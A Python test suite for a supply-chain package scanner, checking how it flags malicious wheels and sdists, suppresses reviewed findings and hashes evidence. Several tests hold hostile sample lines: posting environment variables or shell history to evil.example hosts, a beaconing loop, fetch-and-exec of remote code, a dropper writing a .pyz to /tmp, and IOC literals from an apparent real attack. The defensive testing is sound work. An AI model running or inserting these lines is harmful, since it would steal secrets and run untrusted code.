"""Regression tests for `scripts/scan_packages.py`, driving the offline
`scan_archive` helper against fixtures under `tests/security/fixtures/`."""

from __future__ import annotations

import hashlib
import json
import os
import re
import subprocess
import sys
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parents[2]
FIXTURES = Path(__file__).resolve().parent / "fixtures"

sys.path.insert(0, str(REPO_ROOT))
from scripts import scan_packages as sp  # noqa: E402


def test_fixture_files_exist():
    for name in ("malicious_wheel.whl", "clean_wheel.whl", "malicious_sdist.tar.gz"):
        assert (FIXTURES / name).is_file(), name


def test_fixture_bytes_are_deterministic(tmp_path):
    """Re-running `_build.py` must produce byte-identical archives (deterministic builds)."""
    expected: dict[str, str] = {}
    for name in ("malicious_wheel.whl", "clean_wheel.whl", "malicious_sdist.tar.gz"):
        expected[name] = hashlib.sha256((FIXTURES / name).read_bytes()).hexdigest()

    rebuild_dir = tmp_path / "rebuild"
    rebuild_dir.mkdir()
    builder_src = (FIXTURES / "_build.py").read_text(encoding = "utf-8")
    rebuilt_helper = rebuild_dir / "_build.py"
    # builder_src came out of a checked-in file, so it carries whatever
    # non-ASCII that file holds and cp1252 cannot encode it back out.
    rebuilt_helper.write_text(builder_src, encoding = "utf-8")
    shim = rebuild_dir / "run.py"
    shim.write_text(
        "import sys, pathlib\n"
        f"sys.path.insert(0, {str(rebuild_dir)!r})\n"
        "import _build\n"
        f"_build.HERE = pathlib.Path({str(rebuild_dir)!r})\n"
        "_build.build_all()\n"
    )
    env = dict(os.environ, SOURCE_DATE_EPOCH = "0")
    proc = subprocess.run(
        [sys.executable, str(shim)],
        env = env,
        capture_output = True,
        text = True,
        timeout = 30,
    )
    assert proc.returncode == 0, proc.stderr

    for name, want_sha in expected.items():
        got = hashlib.sha256((rebuild_dir / name).read_bytes()).hexdigest()
        assert got == want_sha, (
            f"rebuild of {name} produced different bytes:\n"
            f"  expected: {want_sha}\n"
            f"  actual:   {got}\n"
            "_build.py is non-deterministic; pin members tighter."
        )


def _critical_or_high(findings) -> list:
    return [f for f in findings if f.severity in (sp.CRITICAL, sp.HIGH)]


def test_malicious_wheel_triggers_critical():
    findings = sp.scan_archive(
        str(FIXTURES / "malicious_wheel.whl"),
        "malicious_fixture",
    )
    assert findings, "no findings on malicious wheel; scanner regression"
    blockers = _critical_or_high(findings)
    assert blockers, f"no CRITICAL/HIGH findings: {[str(f) for f in findings]}"
    assert any("setup.py" in f.filename for f in blockers)


def test_malicious_sdist_triggers_critical():
    findings = sp.scan_archive(
        str(FIXTURES / "malicious_sdist.tar.gz"),
        "malicious_fixture",
    )
    blockers = _critical_or_high(findings)
    assert blockers, f"no CRITICAL/HIGH findings: {[str(f) for f in findings]}"
    assert any("setup.py" in f.filename for f in blockers)


def test_clean_wheel_no_findings():
    findings = sp.scan_archive(
        str(FIXTURES / "clean_wheel.whl"),
        "clean_fixture",
    )
    assert findings == [], f"unexpected findings on clean wheel: {[str(f) for f in findings]}"


_BLOCKED_AVAILABLE = hasattr(sp, "BLOCKED_PYPI_VERSIONS")
_MAY12_AVAILABLE = hasattr(sp, "RE_MAY12_IOC")


@pytest.mark.skipif(
    not _BLOCKED_AVAILABLE,
    reason = "Fork 1 (BLOCKED_PYPI_VERSIONS) not merged yet",
)
def test_blocked_pypi_versions_complete():
    table = sp.BLOCKED_PYPI_VERSIONS
    assert "guardrails-ai" in table
    assert "0.10.1" in table["guardrails-ai"]
    assert "mistralai" in table
    assert "2.4.6" in table["mistralai"]
    assert "lightning" in table
    assert {"2.6.2", "2.6.3"}.issubset(table["lightning"])


@pytest.mark.skipif(
    not _MAY12_AVAILABLE,
    reason = "Fork 1 (RE_MAY12_IOC) not merged yet",
)
def test_re_may12_ioc_catches_each_literal():
    expected_literals = [
        "git-tanstack.com",
        "/tmp/transformers.pyz",
        "transformers.pyz",
        "With Love TeamPCP",
        "We've been online over 2 hours",
    ]
    pattern: re.Pattern = sp.RE_MAY12_IOC
    for lit in expected_literals:
        assert pattern.search(lit), f"RE_MAY12_IOC missed literal {lit!r}"
    # Clean control: a string with none of the literals must not match.
    assert not pattern.search("import numpy as np")


@pytest.mark.skipif(
    not _MAY12_AVAILABLE,
    reason = "Fork 1 (RE_MAY12_IOC integration) not merged yet",
)
def test_may12_ioc_caught_by_scan_archive():
    """Wired into check_py_file, the malicious wheel's setup.py must flag the May-12 IOC string."""
    findings = sp.scan_archive(
        str(FIXTURES / "malicious_wheel.whl"),
        "malicious_fixture",
    )
    # IOC literals built at runtime so CodeQL's url-substring-sanitization rule doesn't false-positive on the `in`
    # operand (it's evidence, not a URL).
    _ioc_host = "git-tanstack." + "com"
    _ioc_drop = "transformers." + "pyz"
    hit = any(
        _ioc_host in (f.evidence or "")
        or _ioc_drop in (f.evidence or "")
        or "may12" in (f.check or "").lower()
        for f in findings
    )
    assert hit, (
        "RE_MAY12_IOC integration missing; findings = "
        f"{[(f.severity, f.check, f.evidence[:80]) for f in findings]}"
    )


def test_scan_packages_pip_download_failure_propagates(tmp_path):
    """A pip download failure must exit 2 (SCAN INCOMPLETE), not `0 findings, exit 0`.

    Feeds an unresolvable spec; the name is long/random so it can't resolve on any index."""
    script = REPO_ROOT / "scripts" / "scan_packages.py"
    assert script.is_file(), script
    unresolvable = "pkg-that-does-not-exist-0123456789-fork-c-silentfail==0.0.0"
    proc = subprocess.run(
        [sys.executable, str(script), unresolvable],
        cwd = str(tmp_path),
        capture_output = True,
        text = True,
        timeout = 180,
    )
    combined = proc.stdout + proc.stderr
    assert proc.returncode == 2, (
        f"expected exit 2 (download failure -> scan incomplete), got "
        f"{proc.returncode}\n--- stdout ---\n{proc.stdout}\n"
        f"--- stderr ---\n{proc.stderr}"
    )
    assert "SCAN INCOMPLETE" in combined or "pip download failed" in combined


def test_archive_corruption_produces_critical_finding(tmp_path):
    """SF1: a corrupted wheel (once silently skipped) must yield a CRITICAL `archive_corrupted`."""
    bad = tmp_path / "broken-0.0.1-py3-none-any.whl"
    bad.write_bytes(b"X")  # 1-byte "wheel" -- not a valid zip container
    findings = sp.scan_archive(str(bad), "broken_fixture")
    assert findings, "scan_archive returned 0 findings on corrupt wheel"
    corrupted = [f for f in findings if f.check == "archive_corrupted"]
    assert corrupted, (
        "no archive_corrupted finding; got " f"{[(f.severity, f.check) for f in findings]}"
    )
    assert all(f.severity == sp.CRITICAL for f in corrupted)

    bad_tar = tmp_path / "broken-0.0.1.tar.gz"
    bad_tar.write_bytes(b"not-a-real-gzip-stream")
    findings_tar = sp.scan_archive(str(bad_tar), "broken_fixture")
    corrupted_tar = [f for f in findings_tar if f.check == "archive_corrupted"]
    assert corrupted_tar, (
        "no archive_corrupted finding on corrupt tarball; got "
        f"{[(f.severity, f.check) for f in findings_tar]}"
    )


def test_strip_noncode_blanks_docstrings_and_comments_keeps_geometry():
    src = (
        '"""Module doc mentions subprocess.Popen and reverse shell."""\n'
        "x = 1  # os.system('rm -rf /') in a comment\n"
        "def f():\n"
        "    '''calls eval() and exec() in prose'''\n"
        "    return x\n"
    )
    out = sp._strip_noncode(src)
    # Line geometry is byte-stable so evidence L<n> stays correct.
    assert len(out.splitlines()) == len(src.splitlines())
    # Tokens lived only in docstrings/comments -> gone.
    for needle in ("subprocess", "os.system", "eval(", "exec(", "reverse shell"):
        assert needle not in out, needle
    assert "x = 1" in out
    assert "return x" in out


def test_strip_noncode_preserves_real_code_and_assigned_strings():
    src = (
        "import subprocess\n"
        "subprocess.Popen(['/bin/sh', '-c', 'id'])\n"
        "exec(open('x').read())\n"
        "BLOB = '" + ("A" * 64) + "'\n"  # assigned string is code, not a docstring
    )
    out = sp._strip_noncode(src)
    assert out == src, "real code (incl. RHS string literals) must be untouched"


def test_strip_noncode_falls_back_on_syntax_error():
    broken = "def f(:\n    pass  # not valid python\n"
    # Must not raise; returns the original so the content is still scanned.
    assert sp._strip_noncode(broken) == broken


def test_check_py_file_ignores_docstring_only_iocs():
    # A file whose only dangerous patterns live in a docstring must be clean.
    benign = (
        '"""Usage:\n'
        ">>> import subprocess, urllib.request\n"
        ">>> subprocess.Popen(['sh','-c','id'])\n"
        ">>> exec(urllib.request.urlopen('http://evil/x').read())\n"
        '"""\n'
        "VERSION = '1.0'\n"
    )
    findings = sp.check_py_file(benign, "pkg/_doc.py", "pkg")
    assert findings == [], f"docstring IOCs should not flag: {[str(f) for f in findings]}"
    # The same payload as real code still flags.
    real = (
        "import subprocess, urllib.request\n"
        "subprocess.Popen(['sh','-c','id'])\n"
        "exec(urllib.request.urlopen('http://evil/x').read())\n"
    )
    flagged = sp.check_py_file(real, "pkg/evil.py", "pkg")
    assert any(f.severity in (sp.CRITICAL, sp.HIGH) for f in flagged)


def test_extract_evidence_multiline_reports_line():
    # A cross-line DOTALL match must still yield evidence so the baseline entry is reviewable.
    content = "a = 1\ntime.sleep(\n    600\n)\n"
    ev = sp._extract_evidence(content, sp.RE_ANTI_ANALYSIS)
    assert ev and ev.startswith("L"), ev


def test_anti_analysis_no_longer_flags_cross_platform_code():
    # Pure cross-platform code (the old platform.system false positive) must be clean.
    crossplat = (
        "import platform, subprocess\n"
        "if platform.system() == 'Windows':\n"
        "    subprocess.run(['where', 'git'])\n"
        "else:\n"
        "    subprocess.run(['which', 'git'])\n"
    )
    findings = sp.check_py_file(crossplat, "pkg/_compat.py", "pkg")
    anti = [f for f in findings if "Anti-analysis" in f.check]
    assert anti == [], f"cross-platform code should not be anti-analysis: {anti}"


def test_proc_self_status_read_flags_anti_analysis():
    # Reading /proc/self/status + a subprocess call is the classic anti-debug combo.
    # The old `\b/proc/self/status\b` was unsatisfiable (\b adjacent to "/"); the
    # lookbehind fix makes it fire. No TracerPid/ptrace token, so only /proc signals it.
    payload = (
        "import subprocess\n"
        "with open('/proc/self/status') as fh:\n"
        "    data = fh.read()\n"
        "subprocess.run(['echo', 'go'])\n"
    )
    findings = sp.check_py_file(payload, "pkg/_probe.py", "pkg")
    anti = [f for f in findings if "Anti-analysis" in f.check]
    assert anti, "reading /proc/self/status + subprocess must flag anti-analysis"
    assert anti[0].severity == sp.HIGH


def test_proc_self_status_pattern_is_live():
    for s in (
        'open("/proc/self/status")',
        "cat /proc/self/status",
        "path = '/proc/self/status'",
    ):
        assert sp.RE_ANTI_ANALYSIS.search(s), s
    # A bare cross-platform OS check must still NOT match anti-analysis.
    assert not sp.RE_ANTI_ANALYSIS.search("if platform.system() == 'Linux': pass")


def test_fs_enum_does_not_flag_the_word_history():
    # `\bhistory\b.*\bread\b` under re.DOTALL spanned the whole file, so any module mentioning "history" before "read"
    # was filesystem enumeration -- and a CRITICAL alongside a network call. That is how httpx, urllib3, IPython and
    # torch got baselined.
    for s in (
        "history: list[Response] | None = None\n\ndef read(self): pass\n",
        "from IPython.core.history import HistoryManager\n\ndef read(): pass\n",
        "if retries is not None and retries.history:\n    resp.read()\n",
        'if "history" in b:\n    b.read()\n',
    ):
        assert not sp.RE_FS_ENUM.search(s), s


def test_fs_enum_still_flags_real_history_file_reads():
    # The half that matters must fire.
    # The old `\b\.bash_history\b` / `\b\.zsh_history\b` could never match ("~/.bash_history" puts \b between two
    # non-word chars, the same unsatisfiable-\b bug as /proc/self/status above), so every form below was missed.
    for s in (
        'open(os.path.expanduser("~/.bash_history")).read()',
        "p = Path.home() / '.zsh_history'",
        'f = open("/root/.python_history")',
        "open(os.path.expanduser('~/.history'))",
        'hist = os.environ.get("HISTFILE")',
    ):
        assert sp.RE_FS_ENUM.search(s), s


def test_history_theft_plus_network_is_critical():
    payload = (
        "import requests\n"
        "data = open(os.path.expanduser('~/.bash_history')).read()\n"
        "requests.post('http://x.invalid', data = data)\n"
    )
    findings = sp.check_py_file(payload, "pkg/_x.py", "pkg")
    fs = [f for f in findings if "Enumerates filesystem" in f.check]
    assert fs and fs[0].severity == sp.CRITICAL, findings


def _mk(
    sev,
    pkg,
    fname,
    check,
    evidence = "evidence",
):
    return sp.Finding(sev, pkg, fname, check, evidence)


def test_baseline_key_version_stable_but_path_specific():
    a = _mk(sp.CRITICAL, "requests", "requests-2.32.5/requests/sessions.py", "X")
    b = _mk(sp.CRITICAL, "Requests", "requests-3.0.0/requests/sessions.py", "X")
    # Same package-relative path + same matched code across versions -> same key.
    assert sp._finding_key(a) == sp._finding_key(b)
    # Same basename in a different path -> different key (no over-suppression).
    c = _mk(sp.CRITICAL, "requests", "requests-2.32.5/requests/vendor/sessions.py", "X")
    assert sp._finding_key(a) != sp._finding_key(c)


def test_baseline_key_line_shift_stable_but_code_specific():
    # The evidence hash strips ``L<NN>:`` markers, so a benign upstream edit that only shifts line numbers keeps the key
    # stable...
    base = _mk(
        sp.CRITICAL,
        "botocore",
        "botocore/utils.py",
        "Harvests environment variables/secrets AND makes network calls",
        "Env: L417: env = os.environ.copy()\nNetwork: L32: from urllib.request import getproxies",
    )
    shifted = _mk(
        sp.CRITICAL,
        "botocore",
        "botocore/utils.py",
        "Harvests environment variables/secrets AND makes network calls",
        "Env: L612: env = os.environ.copy()\nNetwork: L48: from urllib.request import getproxies",
    )
    assert sp._finding_key(base) == sp._finding_key(shifted)
    # ...but a NEW payload in the same file/check (different matched code) does not inherit the suppression -- this is
    # the supply-chain bypass we close.
    malicious = _mk(
        sp.CRITICAL,
        "botocore",
        "botocore/utils.py",
        "Harvests environment variables/secrets AND makes network calls",
        "Env: L417: env = os.environ.copy()\nNetwork: requests.post('https://evil.example/exfil', data=env)",
    )
    assert sp._finding_key(base) != sp._finding_key(malicious)


def test_annotation_only_network_entries_are_digest_pinned():
    """A baselined finding whose network evidence is only type annotations must pin the file.

    RE_NETWORK matches ``httpx2.Client`` where it appears in a signature, but not a call
    through an instance, so ``client.post(..., data=api_key)`` appended to one of these
    files contributes no evidence: the evidence hash is unchanged and the entry would go
    on suppressing it. Pinning the file digest is what makes any edit reopen the finding,
    which is the property _load_baseline documents for exactly this shape.
    """
    import json
    import pathlib

    baseline = json.loads(
        (
            pathlib.Path(__file__).resolve().parents[2] / "scripts" / "scan_packages_baseline.json"
        ).read_text(encoding = "utf-8")
    )
    credential_adjacent = {
        "openai/_client.py",
        "openai/lib/azure.py",
        "openai/lib/bedrock.py",
        "openai/auth/_workload.py",
    }
    seen = set()
    for entry in baseline["entries"]:
        if entry.get("package") == "openai" and entry.get("file") in credential_adjacent:
            seen.add(entry["file"])
            assert entry.get("file_sha256"), (
                f"{entry['file']} is baselined on evidence that a later payload can leave "
                f"unchanged; it has to pin the reviewed file digest"
            )
    assert seen == credential_adjacent, f"missing entries for {credential_adjacent - seen}"


def test_context_dependent_unsloth_zoo_findings_are_digest_pinned():
    """Require a new review when context around an approved finding changes.

    These three findings sit in files whose matched lines are benign on their own,
    so the approval has to be for the file as it was reviewed, not for the lines.
    `_partition_baseline` gives that: an entry carrying `file_sha256` only suppresses
    while the file still hashes to a pinned value, so any edit reopens it. What this
    guards is that each of the three keeps a pinned approval -- dropping the pin
    turns it into a line-matched approval that a later payload in the same file
    would ride.

    A (file, check) pair can hold several entries, one per revision of the matched
    lines that a release has shipped. compiler.py already carries four. Three of them
    are superseded and unpinned, and those are grandfathered by evidence hash below;
    any variant added from here on has to be pinned, because an unpinned one
    suppresses the finding whatever the file contains.

    It used to also duplicate each approved digest as a literal here, which pinned
    nothing extra (whoever edits the baseline can edit this file in the same commit)
    and cost a red `main`: #10187 re-approved unsloth-zoo 2026.8.17 and moved the
    baseline copy, the copy here was left behind, and the disagreement took
    `Repo tests (CPU)` and `workflow-trigger lint` down on every open PR until
    someone noticed. The digest belongs in the baseline, once.
    """
    import json
    import pathlib
    import re

    path = pathlib.Path(__file__).resolve().parents[2] / "scripts" / "scan_packages_baseline.json"
    entries = json.loads(path.read_text(encoding = "utf-8"))["entries"]
    must_be_pinned = {
        (
            "unsloth_zoo/vision_utils.py",
            "Harvests environment variables/secrets AND makes network calls",
        ),
        (
            "unsloth_zoo/vision_utils.py",
            "Accesses cloud metadata/IMDS AND makes network calls",
        ),
        (
            "unsloth_zoo/compiler.py",
            "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
        ),
    }
    # The evidence hashes of the superseded compiler.py variants, which are already
    # in the baseline unpinned. These are frozen by construction: an evidence hash is
    # over code a past zoo release shipped, so unlike the live digest it can never
    # move, and listing them here brings back no drift. They are grandfathered rather
    # than pinned because pinning them would be pinning a file no installed zoo has.
    #
    # Everything else has to be pinned. `_load_baseline` keys each variant on its own
    # evidence_hash and maps an unpinned one to None, i.e. suppress for any file
    # contents, so appending a new unpinned variant for one of these pairs would
    # silence the finding entirely while an older pinned variant kept this test green.
    GRANDFATHERED_UNPINNED = {
        "ec1875fd32d00fe885e566ebda75163e46e838ca31020abb57e0991892c2bdf7",
        "d8dabff7099fd84e1276c932c7bb70ba273333e5708eb149fec6a6130856085d",
        "610993c0b6f612bbbf2fa0b593591375e7b20cb5c9b516ea60b6c44a8b9430e9",
    }
    pinned = set()
    for entry in entries:
        key = (entry.get("file"), entry.get("check"))
        if entry.get("package") != "unsloth-zoo" or key not in must_be_pinned:
            continue
        digest = entry.get("file_sha256")
        if isinstance(digest, str) and re.fullmatch(r"[0-9a-f]{64}", digest):
            pinned.add(key)
            continue
        assert entry.get("evidence_hash") in GRANDFATHERED_UNPINNED, (
            f"{key[0]} has a new unpinned entry for {key[1]!r} "
            f"(evidence_hash {entry.get('evidence_hash')!r}). An unpinned variant "
            f"suppresses that finding whatever the file contains, so a re-approval "
            f"has to carry file_sha256 rather than ride the evidence alone."
        )
    for key in sorted(must_be_pinned - pinned):
        raise AssertionError(
            f"{key[0]} is baselined for {key[1]!r} with no reviewed file digest, so "
            f"it is approved on evidence that a later payload can leave unchanged. "
            f"Re-approve it with --write-baseline and keep the file_sha256 pin."
        )


def test_context_dependent_unsloth_zoo_pins_reopen_on_other_file_changes():
    """Unchanged matched lines cannot approve a changed surrounding file."""
    import json
    import pathlib

    path = pathlib.Path(__file__).resolve().parents[2] / "scripts" / "scan_packages_baseline.json"
    entries = json.loads(path.read_text(encoding = "utf-8"))["entries"]
    targets = [
        entry
        for entry in entries
        if entry.get("package") == "unsloth-zoo"
        and entry.get("file") in {"unsloth_zoo/vision_utils.py", "unsloth_zoo/compiler.py"}
        and entry.get("file_sha256")
    ]
    # Three (file, check) pairs are pinned; a re-approval may append a revision
    # rather than replace one, so count the pairs covered, not the entries. An
    # exact entry count here would go red the first time a zoo release is
    # approved by appending, which is the shape the torch and huggingface-hub
    # entries in this baseline already have.
    assert {(e["file"], e["check"]) for e in targets} == {
        (
            "unsloth_zoo/vision_utils.py",
            "Harvests environment variables/secrets AND makes network calls",
        ),
        ("unsloth_zoo/vision_utils.py", "Accesses cloud metadata/IMDS AND makes network calls"),
        ("unsloth_zoo/compiler.py", "Advanced obfuscation (marshal/compile/zlib) + exec/eval"),
    }
    baseline = sp._load_baseline(str(path))
    for entry in targets:
        reviewed = _mk(
            entry["severity"],
            entry["package"],
            entry["file"],
            entry["check"],
            entry["evidence"],
        )
        reviewed.file_sha256 = entry["file_sha256"]
        changed = _mk(
            entry["severity"],
            entry["package"],
            entry["file"],
            entry["check"],
            entry["evidence"],
        )
        changed.file_sha256 = "0" * 64

        active, suppressed = sp._partition_baseline([reviewed], baseline)
        assert active == [] and suppressed == [reviewed]
        active, suppressed = sp._partition_baseline([changed], baseline)
        assert active == [changed] and suppressed == []


def test_the_hf_backoff_suppression_is_narrow():
    """The huggingface-hub `http_backoff` allowlist must not cover a second loop.

    Security audit went red on every main commit from fc325f431 onward with one
    un-baselined CRITICAL, "C2 polling/beaconing loop detected" in
    huggingface_hub/utils/_http.py. No repo commit caused it: the resolved
    huggingface-hub moved off the 0.x line, and 1.26.1, 1.27.0 and 1.28.0 all carry
    the loop while 0.36.2 does not.

    It is `http_backoff`: a bounded retry that counts `nb_tries` against
    `max_retries`, sleeps with exponential backoff between attempts, and raises
    once the budget is spent. RE_C2_POLLING is `while True .* sleep .* requests\.`
    under re.DOTALL, so it cannot tell that shape apart from a real beacon, which
    is why the file is allowlisted rather than the check weakened.

    This file now carries four entries for the same check -- L298, L461, L462 and
    L461 again -- one per revision of that loop that huggingface-hub has shipped.
    That is the mechanism working as designed, not drift: the key is digest-pinned,
    so every edit to the loop reopens the finding and asks for a fresh review. The
    cost is that a hub release touching those thirty lines turns Security audit red
    until someone looks. Worth knowing before treating the next one as a break.

    Allowlisting a CRITICAL in a file that already speaks HTTP is the part worth
    guarding. Each entry has to keep suppressing exactly the loop it was reviewed
    against, so a payload appended to the same file and check reopens the finding
    rather than inheriting the suppression.
    """
    import json
    import pathlib as _pathlib

    baseline = json.loads(
        (
            _pathlib.Path(__file__).resolve().parents[2] / "scripts" / "scan_packages_baseline.json"
        ).read_text(encoding = "utf-8")
    )
    entries = [
        e
        for e in baseline["entries"]
        if e.get("package") == "huggingface-hub"
        and e.get("file") == "huggingface_hub/utils/_http.py"
        and e.get("check") == "C2 polling/beaconing loop detected"
    ]
    assert entries, "http_backoff is no longer allowlisted; Security audit is red"

    # Digest-pinned, not line-pinned: each evidence carries the sha256 of the span it was reviewed against, which is
    # what makes an edit to the loop reopen the finding instead of riding the old entry.
    for entry in entries:
        assert "sha256:" in entry["evidence"], (
            f"{entry['evidence_hash'][:12]} is not pinned to reviewed code, so any "
            f"while-True loop in this file would inherit its suppression"
        )
        assert entry.get(
            "evidence_hash"
        ), "no evidence_hash: _load_baseline would recompute it as a legacy entry"
    hashes = [e["evidence_hash"] for e in entries]
    assert len(set(hashes)) == len(hashes), "duplicate entries for the same reviewed span"

    # The blast radius. A beaconing loop appended to the same file, under the same check, must produce a different key.
    reviewed_src = (
        "import time\n"
        "import requests\n"
        "def http_backoff():\n"
        "    while True:\n"
        "        r = requests.get(url)\n"
        "        if nb_tries > max_retries:\n"
        "            raise err\n"
        "        time.sleep(sleep_time)\n"
    )
    payload_src = reviewed_src + (
        "def beacon():\n"
        "    while True:\n"
        "        requests.post('https://evil.example/c2', data=os.environ)\n"
        "        time.sleep(30)\n"
    )
    reviewed = _mk(
        sp.CRITICAL,
        "huggingface-hub",
        "huggingface_hub/utils/_http.py",
        "C2 polling/beaconing loop detected",
        sp._extract_evidence(reviewed_src, sp.RE_C2_POLLING),
    )
    payload = _mk(
        sp.CRITICAL,
        "huggingface-hub",
        "huggingface_hub/utils/_http.py",
        "C2 polling/beaconing loop detected",
        sp._extract_evidence(payload_src, sp.RE_C2_POLLING),
    )
    assert sp._finding_key(reviewed) != sp._finding_key(payload), (
        "a beaconing loop appended to _http.py keeps the reviewed key, so the "
        "http_backoff allowlist would suppress it too"
    )


def test_network_check_sees_httpx2():
    """httpx2 is a separate import name, not a submodule of httpx.

    openai 3.0.0 requires httpx2 and routes every call through it. While the network
    check matched only ``httpx.``, the SDK's own HTTP was invisible to each combined
    check that needs a network half, so reading OPENAI_API_KEY next to an httpx2 call
    did not register as secrets-plus-network at all.
    """
    for call in ("httpx2.get(u)", "httpx2.post(u)", "httpx2.Client()", "httpx2.AsyncClient()"):
        assert sp.RE_NETWORK.search(call), call
    for call in ("httpx.get(u)", "httpx.Client()"):
        assert sp.RE_NETWORK.search(call), call
    for miss in ("myhttpx.get(u)", "httpx23.get(u)", "httpx2.Timeout(5)"):
        assert not sp.RE_NETWORK.search(miss), miss


def test_httpx2_secrets_plus_network_is_one_finding():
    """The combined check has to fire on a file that reads a secret and calls httpx2."""
    src = 'import os, httpx2\nk = os.environ.get("OPENAI_API_KEY")\nhttpx2.Client().get(u)\n'
    assert sp.RE_NETWORK.search(src)
    assert sp.RE_ENV_HARVEST.search(src)


def test_extract_evidence_records_all_matches():
    # The whole point of P1: a match appended after the first few must show up in the evidence, so it changes the key
    # instead of riding the earlier ones.
    src = "import requests\n" + "\n".join(f"requests.get('http://a{i}')" for i in range(6))
    ev = sp._extract_evidence(src, sp.RE_NETWORK)
    assert ev.count("requests.get(") == 6


def test_baseline_key_reopens_on_appended_match():
    # A reviewed file already trips a check with several matches; a later exfil call appended to the same file/check
    # must reopen the finding.
    base_src = "import requests\n" + "\n".join(f"requests.get('http://a{i}')" for i in range(3))
    payload_src = base_src + "\nrequests.post('https://evil.example/exfil', data=os.environ)"
    base = _mk(sp.CRITICAL, "p", "p/net.py", "net", sp._extract_evidence(base_src, sp.RE_NETWORK))
    payload = _mk(
        sp.CRITICAL, "p", "p/net.py", "net", sp._extract_evidence(payload_src, sp.RE_NETWORK)
    )
    assert sp._finding_key(base) != sp._finding_key(payload)


def test_baseline_key_inner_line_marker_is_not_stripped():
    # Only the leading L<NN>: marker is dropped; an L<NN>: inside the matched code is part of the code, so changing it
    # must reopen the finding...
    a = _mk(sp.CRITICAL, "p", "p/u.py", "c", "L10: url = 'http://h/L42:/p'")
    b = _mk(sp.CRITICAL, "p", "p/u.py", "c", "L10: url = 'http://h/L7:/p'")
    assert sp._finding_key(a) != sp._finding_key(b)
    c = _mk(sp.CRITICAL, "p", "p/u.py", "c", "L55: url = 'http://h/L42:/p'")
    assert sp._finding_key(a) == sp._finding_key(c)


def test_baseline_key_indentation_is_significant():
    # Moving a flagged line out of a guarded block (dedent) changes executable context, so the same code at a different
    # indent must reopen the finding.
    guarded = _mk(sp.CRITICAL, "p", "p/x.py", "c", "L5:     requests.get(url)")
    top_level = _mk(sp.CRITICAL, "p", "p/x.py", "c", "L5: requests.get(url)")
    assert sp._finding_key(guarded) != sp._finding_key(top_level)


def test_canon_evidence_keeps_bitwise_or_in_a_span():
    # ' | ' only delimits spans when it precedes an L<NN>: marker;
    # a pipe inside matched code (bitwise OR, typing.Union) is code, so changing an operand must reopen the finding
    # instead of deduping to the same key.
    a = _mk(sp.CRITICAL, "p", "p/x.py", "c", "L5: mode = os.O_RDONLY | os.O_CLOEXEC")
    b = _mk(sp.CRITICAL, "p", "p/x.py", "c", "L5: mode = os.O_RDONLY | os.O_EVIL")
    assert sp._finding_key(a) != sp._finding_key(b)
    assert sp._canon_evidence("L5: a = X | Y") == "a = X | Y"


def test_extract_evidence_caps_long_line_but_binds_tail():
    # A long (e.g. minified) line is not dumped verbatim: the display is bounded to a prefix, but a sha256 of the
    # full line is appended so a payload past the cut still changes the key instead of being silently clipped.
    marker = "EXFIL_PAST_CAP"
    pad = "# " + " " * 300
    line = "requests.get('http://a')  " + pad + marker
    ev = sp._extract_evidence(line + "\n", sp.RE_NETWORK)
    assert marker not in ev  # tail past the cap is not shown verbatim
    assert "sha256:" in ev  # but it is pinned by a digest
    assert len(ev) < len(line)  # bounded, not the whole minified line
    base = sp._extract_evidence("requests.get('http://a')  " + pad + "x\n", sp.RE_NETWORK)
    assert sp._evidence_hash(ev) != sp._evidence_hash(base)


def test_extract_evidence_binds_call_continuation_past_12_lines():
    # A matched call that stays open well beyond the old 12-line continuation cap still binds its later arguments: a
    # changed body on a deep continuation line (here ~22 lines in) must reopen instead of riding the first 12 lines.
    head = "requests.post('http://h',\n"
    middle = "".join(f"    opt{i} = ({i}),\n" for i in range(20))
    old = head + middle + "    data = {'x': 'old'},\n)\n"
    new = head + middle + "    data = {'x': 'evil'},\n)\n"
    eo = sp._extract_evidence(old, sp.RE_NETWORK)
    en = sp._extract_evidence(new, sp.RE_NETWORK)
    assert sp._evidence_hash(eo) != sp._evidence_hash(en)


def test_logical_line_end_follows_backslash_continuation():
    # A call split with an explicit backslash before the parenthesis must still bind the continuation line, so changing
    # the URL on the next physical line reopens instead of returning at the zero-depth API line.
    old = "requests.post \\\n    ('http://old/x', data = 1)\n"
    new = "requests.post \\\n    ('http://evil/x', data = 1)\n"
    eo = sp._extract_evidence(old, sp.RE_NETWORK)
    en = sp._extract_evidence(new, sp.RE_NETWORK)
    assert sp._evidence_hash(eo) != sp._evidence_hash(en)


def test_logical_line_end_blanks_multiline_triple_string():
    # A ) inside a triple-quoted string argument must not close the call early; the
    # data= after the closing triple-quote must still bind so a changed payload
    # reopens (a per-line string blanker cannot mask a multi-line string).
    old = 'requests.post("""http://h\n/path)""", data={"x": "old"})\n'
    new = 'requests.post("""http://h\n/path)""", data={"x": "evil"})\n'
    eo = sp._extract_evidence(old, sp.RE_NETWORK)
    en = sp._extract_evidence(new, sp.RE_NETWORK)
    assert sp._evidence_hash(eo) != sp._evidence_hash(en)


def test_extract_evidence_binds_call_embedded_in_string():
    # A call whose text lives INSIDE a triple-quoted string (a dropper embedding a
    # setup.py payload) must still bind its argument lines. Blanking the multi-line
    # string must not shrink the span below the legacy single-line view: the union
    # of both views keeps the URL argument bound so a changed payload reopens.
    src = (
        'PAYLOAD = """\n'
        "urllib.request.urlretrieve(\n"
        '    "http://evil/old.pyz",\n'
        '    "/tmp/x.pyz",\n'
        ")\n"
        '"""\n'
    )
    eo = sp._extract_evidence(src, sp.RE_NETWORK)
    en = sp._extract_evidence(src.replace("old.pyz", "evil2.pyz"), sp.RE_NETWORK)
    assert "L3" in eo  # the URL argument line is bound, not just the API line
    assert sp._evidence_hash(eo) != sp._evidence_hash(en)


def test_extract_evidence_overflow_digest_is_line_shift_stable():
    # The overflow digest canonicalizes (strips L<NN>: markers), so inserting an unrelated line above the overflow
    # region does not change it, while a real payload change inside the overflow still reopens.
    n = sp._MAX_EVIDENCE_SPANS
    src = "\n".join(f"requests.get('http://a/p{i}')" for i in range(n + 5))
    sha = lambda e: re.search(r"more\) sha256:([0-9a-f]+)", e).group(1)
    e_a = sp._extract_evidence(src, sp.RE_NETWORK)
    assert "more) sha256:" in e_a
    e_shift = sp._extract_evidence("# unrelated\n" + src, sp.RE_NETWORK)
    assert sha(e_a) == sha(e_shift)  # a pure line shift does not change the digest
    e_chg = sp._extract_evidence(src.replace(f"a/p{n + 3}'", "a/pEVIL'"), sp.RE_NETWORK)
    assert sha(e_a) != sha(e_chg)  # a real change in the overflow region reopens


def test_extract_evidence_overflow_is_streamed_and_bounded():
